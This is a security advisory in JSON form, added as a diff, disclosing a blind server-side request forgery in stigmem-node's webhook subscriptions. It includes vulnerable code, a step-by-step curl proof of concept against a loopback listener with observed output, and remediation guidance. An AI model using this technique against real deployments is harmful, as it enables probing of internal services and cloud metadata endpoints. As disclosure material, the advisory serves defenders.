@@ -1,0 +1,73 @@
+{
+  "id": "GHSA-5p3m-vhh6-9236",
+  "modified": "2026-08-20T18:45:13.462126527Z",
+  "published": "2026-08-20T18:30:50Z",
+  "aliases": [
+    "CVE-2026-76239"
+  ],
+  "summary": "stigmem-node has blind SSRF via unvalidated webhook subscription delivery_address",
+  "details": "### Summary\n\nStigmem allows an authenticated user to create a webhook subscription with a user-controlled `delivery_address`. That value is stored and later used directly by the subscription delivery worker as the destination of a server-side HTTP POST request.\n\nThe codebase already contains an outbound SSRF guard, `assert_safe_url()`, which blocks loopback, private, link-local, and metadata-style destinations. However, the subscription webhook delivery path does not appear to apply this guard either when the subscription is created or immediately before delivery.\n\nAs a result, an authenticated user can configure a webhook destination such as `http://127.0.0.1:9999/ssrf`, trigger a matching fact-change event, and cause the Stigmem server to issue a server-side HTTP request to an internal loopback address.\n\n### Details\n\nRelevant files:\n\n```text\nnode/src/stigmem_node/routes/subscriptions.py\nnode/src/stigmem_node/subscription_delivery.py\nnode/src/stigmem_node/models/subscriptions.py\nnode/src/stigmem_node/utility/net_util.py\n\nSubscriptionCreateRequest accepts delivery_address as a plain string and validates only that it has a minimum length:\n\nclass SubscriptionCreateRequest(BaseModel):\n    target: str = Field(..., min_length=1)\n    on_change: str = Field(...)\n    delivery_address: str = Field(..., min_length=1)\n\nThe create route persists this value directly:\n\nconn.execute(\n    \"\"\"INSERT INTO subscriptions\n       (id, subscriber_identity, target, target_kind, on_change,\n        delivery_address, idempotency_key, created_at, tenant_id)\n       VALUES (?,?,?,?,?,?,?,?,?)\"\"\",\n    (\n        sub_id,\n        identity.entity_uri,\n        req.target,\n        target_kind,\n        req.on_change,\n        req.delivery_address,\n        req.idempotency_key,\n        now,\n        identity.tenant_id,\n    ),\n)\n\nThe delivery worker later sends a server-side request to the stored value:\n\nwith httpx.Client(timeout=10.0) as client:\n    resp = client.post(\n        event[\"delivery_address\"],\n        json=body,\n        headers={\n            \"Content-Type\": \"application/json\",\n            \"X-Stigmem-Event-Id\": event[\"id\"],\n        },\n    )\n\nThe codebase already has an SSRF guard in node/src/stigmem_node/utility/net_util.py:\n\ndef assert_safe_url(\n    url: str,\n    *,\n    allow_schemes: frozenset[str] = frozenset({\"https\"}),\n) -\u003e None:\n\nThis guard blocks private, loopback, link-local, and metadata-style ranges, including 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, and 169.254.0.0/16.\n\nHowever, I did not observe assert_safe_url() being called for subscription delivery_address during subscription creation or before webhook delivery.\n\nPoC\n\nTested against stigmem-node 0.9.0a10.\n\nStart an internal listener on the same host:\nconst http = require(\"http\");\n\nhttp.createServer((req, res) =\u003e {\n  console.log(\"HIT:\", req.method, req.url);\n  console.log(\"HEADERS:\", req.headers);\n\n  let body = \"\";\n  req.on(\"data\", chunk =\u003e body += chunk);\n  req.on(\"end\", () =\u003e {\n    console.log(\"BODY:\", body);\n    res.writeHead(200, { \"Content-Type\": \"application/json\" });\n    res.end(JSON.stringify({ ok: true, internal: true }));\n  });\n}).listen(9999, \"127.0.0.1\", () =\u003e {\n  console.log(\"Listening on http://127.0.0.1:9999\");\n});\nStart Stigmem locally:\ncd node\npip install -e .\nexport STIGMEM_DB_PATH=\"$(pwd)/ssrf-test.db\"\nexport STIGMEM_AUTH_REQUIRED=true\nexport STIGMEM_HOST=127.0.0.1\nexport STIGMEM_PORT=8765\nexport STIGMEM_SUBSCRIPTION_DELIVERY_SWEEP_S=1\nexport KEY=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nstigmem auth bootstrap-key --key \"$KEY\"\nstigmem-node\nConfirm the service is running:\ncurl -i http://127.0.0.1:8765/healthz\n\nResponse:\n\nHTTP/1.1 200 OK\n{\"status\":\"ok\"}\nCreate a webhook subscription whose delivery_address points to loopback:\ncurl -i -X POST \"http://127.0.0.1:8765/v1/subscriptions\" \\\n  -H \"Authorization: Bearer $KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"target\": \"local\",\n    \"on_change\": \"webhook\",\n    \"delivery_address\": \"http://127.0.0.1:9999/ssrf\",\n    \"idempotency_key\": \"ssrf-test-1\"\n  }'\n\nObserved response:\n\nHTTP/1.1 201 Created\n\nThe response confirmed that the loopback webhook destination was accepted and stored:\n\n{\n  \"on_change\": \"webhook\",\n  \"delivery_address\": \"http://127.0.0.1:9999/ssrf\",\n  \"circuit_open\": false,\n  \"consecutive_failures\": 0\n}\nTrigger a matching fact-change event:\ncurl -i -X POST \"http://127.0.0.1:8765/v1/facts\" \\\n  -H \"Authorization: Bearer $KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"entity\": \"stigmem://test/entity/ssrf\",\n    \"relation\": \"test:relation\",\n    \"value\": { \"type\": \"text\", \"v\": \"trigger webhook ssrf\" },\n    \"source\": \"stigmem://test/source/researcher\",\n    \"scope\": \"local\"\n  }'\nThe internal listener receives a server-side request from Stigmem:\nHIT: POST /ssrf\nHEADERS: {\n  host: '127.0.0.1:9999',\n  accept: '*/*',\n  'accept-encoding': 'gzip, deflate',\n  connection: 'keep-alive',\n  'user-agent': 'python-httpx/0.28.1',\n  'content-type': 'application/json',\n  'x-stigmem-event-id': '\u003cevent-id\u003e',\n  'content-length': '506'\n}\n\nThe body contained the Stigmem event payload, including the subscription id, entity, relation, value, source, timestamp, and scope.\n\nThis confirms that an authenticated user-controlled subscription webhook destination can cause the Stigmem backend to connect to an internal loopback service.\n\nImpact\n\nThis creates a blind SSRF primitive from the Stigmem server.\n\nAn authenticated user can cause the Stigmem backend to make HTTP POST requests to internal destinations reachable from the server, including loopback services, private network services, and link-local metadata-style endpoints if reachable in the deployment environment.\n\nPotential impact includes:\n\n- Internal service probing through webhook delivery success/failure behavior\n- Requests to localhost-only admin services\n- Requests to private RFC1918 network services\n- Requests to cloud metadata/link-local endpoints where reachable\n- Persistent SSRF because the malicious webhook destination is stored and retried\n\nEven if the HTTP response body is not returned to the attacker, delivery status, retry behavior, circuit-breaker behavior, and logs may provide an internal reachability oracle.\n\nSuggested remediation\n\nApply destination validation at both subscription creation time and delivery time.\n\nRecommended changes:\n\n1. For `on_change=\"webhook\"`, validate `delivery_address` with `assert_safe_url()`.\n2. Prefer `https://` only by default.\n3. If `http://` is needed for local development, require an explicit operator-controlled allowlist.\n4. Re-validate immediately before delivery to reduce stale validation and DNS rebinding risk.\n5. Disable redirects or validate every redirect target before following.\n6. Add regression tests proving that localhost, 127.0.0.1, private RFC1918 ranges, and 169.254.169.254 are rejected as webhook destinations.\n\nExample patch pattern:\n\nfrom stigmem_node.utility.net_util import assert_safe_url\n\nif req.on_change == \"webhook\":\n    try:\n        assert_safe_url(req.delivery_address, allow_schemes=frozenset({\"https\"}))\n    except ValueError as exc:\n        raise HTTPException(status_code=400, detail=f\"unsafe webhook URL: {exc}\") from exc\n\nAnd before delivery:\n\ntry:\n    assert_safe_url(event[\"delivery_address\"], allow_schemes=frozenset({\"https\"}))\nexcept ValueError:\n    mark_delivery_failed(...)\n    return\n\nBefore clicking submit, attach screenshot or paste the listener proof in the PoC section. This is the key evidence:\n\n```text\nHIT: POST /ssrf\nuser-agent: python-httpx/0.28.1\nx-stigmem-event-id: ...\n\nKindly check this out:\n[Eidetic_CVE_Report.pdf](https://github.com/user-attachments/files/28415009/Eidetic_CVE_Report.pdf)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "stigmem-node",
+        "purl": "pkg:pypi/stigmem-node"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.9.0a11"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.9.0a1",
+        "0.9.0a10",
+        "0.9.0a2",
+        "0.9.0a3",
+        "0.9.0a4",
+        "0.9.0a5",
+        "0.9.0a6",
+        "0.9.0a7",
+        "0.9.0a8",
+        "0.9.0a9"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-5p3m-vhh6-9236/GHSA-5p3m-vhh6-9236.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-5p3m-vhh6-9236"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/eidetic-labs/stigmem/pull/726"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/eidetic-labs/stigmem/commit/11637401d50629fef040382aee5af4571842c152"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/eidetic-labs/stigmem/commit/2ff5be29291d1c042e00d57c5f9ef93650cc90e0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/eidetic-labs/stigmem"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/eidetic-labs/stigmem/releases/tag/v0.9.0a11"
+    }
+  ]
+}
